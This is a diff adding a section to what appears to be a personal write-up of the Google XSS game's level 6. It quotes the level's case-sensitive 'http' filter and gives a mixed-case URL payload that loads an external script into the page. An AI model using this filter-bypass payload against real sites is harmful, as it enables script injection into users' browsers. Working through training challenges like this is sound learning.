@@ -122,3 +122,19 @@ I found this solution lame as it didn't actually load external javascript persay
 
 All in all, I learned quite a bit in Cross Side Scripting attacks.
 
+I facepalmed a few minutes after writing the previous bit
+=================
+The code only checks for lower case! 
+```javascript
+      // This will totally prevent us from loading evil URLs!
+      if (url.match(/^https?:\/\//)) {
+        setInnerText(document.getElementById("log"),
+          "Sorry, cannot load a URL containing \"http\".");
+        return;
+      }
+```
+
+So the real solution is 
+```
+    https://xss-game.appspot.com/level6/frame#hTtps://babbage.cs.missouri.edu/~ascp6/xss/alert.js
+```
